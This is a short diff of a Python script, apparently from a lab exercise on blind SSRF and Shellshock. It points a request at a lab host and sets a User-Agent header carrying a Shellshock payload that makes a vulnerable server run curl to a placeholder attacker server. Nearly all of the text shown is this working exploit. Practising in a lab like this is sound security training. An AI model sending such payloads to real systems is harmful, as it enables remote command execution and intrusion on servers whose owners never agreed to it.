@@ -16,7 +16,7 @@
 #
 import requests
 
-url = "http://lab-site/preview_post/1"
+url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
 headers = {
     "User-Agent": "() { :; }; curl http://YOUR-SERVER/"
 }
